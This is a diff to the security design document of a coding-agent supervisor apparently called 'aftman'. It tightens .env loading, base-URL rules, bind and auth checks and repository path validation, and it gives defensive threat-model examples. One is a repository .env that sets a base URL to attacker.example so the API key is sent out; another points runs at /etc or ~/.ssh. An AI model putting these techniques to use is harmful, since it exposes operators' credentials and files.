@@ -22,9 +22,19 @@ it is at protecting your working tree, and the docs say so rather than implying 
 
 - Read from `TYPESAFE_API_KEY` (compatible with the upstream SDK) or `AFTMAN_JEV_API_KEY`.
 - `.env` loading order, non-overriding, real environment always wins:
-  1. `<repo>/.env` — loaded **before** anything else, and a repository-supplied `.env` may **not**
-     override a value already present in the environment;
-  2. `$XDG_CONFIG_HOME/aftman/.env`.
+  1. `$XDG_CONFIG_HOME/aftman/.env`;
+  2. the process environment.
+- **`<repo>/.env` is never loaded into the supervisor process.** This is a deliberate divergence
+  from upstream. The attack it closes: a cloned repository ships
+  `TYPESAFE_BASE_URL=https://attacker.example` in its `.env`; the operator has `TYPESAFE_API_KEY`
+  exported but no explicit base URL; the repo's value is the only one present, so it is adopted,
+  and the next request sends `Authorization: Bearer <key>` to the attacker. Non-overriding
+  precedence does **not** help here, because the variable was never set in the first place.
+  A repository `.env` may still be passed to the *worker* environment as ordinary variables; it may
+  not reach supervisor configuration.
+- **The base URL must be `https://…` or a loopback address.** A cleartext non-loopback base URL is a
+  startup error, because it would put the key on the wire in the clear. `aftman doctor` prints the
+  resolved scheme and host so an unexpected redirect is visible before the first request.
 - Optional OS keyring support (`keyring` crate) via `aftman auth login`, for operators who do not
   want a key in a shell profile. Env var still takes precedence when both exist.
 - `aftman doctor` reports presence, never the value, and never a prefix or length.
@@ -49,6 +59,14 @@ Rationale: a coding agent is a general-purpose program with shell access that re
 can read the supervisor's key, then any prompt injection that reaches it can exfiltrate the key,
 and the key is billable. The agent's own authentication comes from its own CLI login and is
 unaffected.
+
+### 2.2a Project-local agent configuration
+
+The same logic applies one level down: a cloned repository can carry executable agent configuration
+(`pi` extensions and skills, `claude` project settings, `agy` projects). Aftman does not load it by
+default — `pi` runs with `--no-approve`, and `agy`/`claude` are not given project-config trust.
+`[workers] trust_project_config = true` opts in, is recorded in `meta.json`, and warns. See
+[04-workers.md §8.2](04-workers.md).
 
 Provider keys are *not* granted by default. `[workers] inherit_provider_keys = ["ANTHROPIC_API_KEY"]`
 opts in for backends that need an API key instead of a login, and every run that does so records
@@ -108,7 +126,21 @@ The correct controls are the agent's own sandbox, a container, or a throwaway ch
 
 Implementation details:
 
-- Binding to a non-loopback address with `auth = "none"` is a **startup error**, not a warning.
+- **Any non-loopback bind with `auth != "token"` is a startup error**, not a warning. This
+  deliberately includes `auth = "loopback"`: an earlier revision only rejected `auth = "none"`,
+  which left it undefined whether a `--bind 0.0.0.0` plus the default `auth = "loopback"` served
+  LAN peers unauthenticated.
+- `auth = "loopback"` additionally rejects any request whose peer address is not loopback, as
+  defence in depth. `tailscale serve` proxies from loopback, so the default posture still works end
+  to end with the port never opened on a physical interface.
+- **`repo` paths are validated against `web.allowed_repo_roots`.** `POST /v1/runs` accepts a
+  filesystem path, and a run's observation is readable afterwards, so without an allow-list a
+  token holder could point a run at `/etc` or `~/.ssh` and read what the observation collected.
+  Paths are canonicalised (symlinks resolved) and must land inside a configured root; anything else
+  is `invalid_repo`. Under `auth = "loopback"` the default root is `$HOME`; under `auth = "token"`
+  an explicit `allowed_repo_roots` is required.
+- A repository that is not a git work tree is rejected unless `[web] allow_non_git_repos = true`,
+  since a non-git tree is not a code repository and is almost always a mistake or a probe.
 - Token comparison is constant-time; the token is compared as bytes, never logged, and never
   included in error messages.
 - SSE `?token=` is accepted only because `EventSource` cannot set headers. The cookie-login flow is
@@ -118,7 +150,7 @@ Implementation details:
   explicitly listed in `web.allowed_origins`.
 - No plugins, no `eval`, no user-supplied routes.
 - The API cannot read arbitrary files: `/v1/runs` returns observations that aftman *chose* to
-  collect, already bounded. There is no `GET /file?path=`.
+  collect, already bounded and scoped to an allowed root. There is no `GET /file?path=`.
 
 ## 5. Socket
 
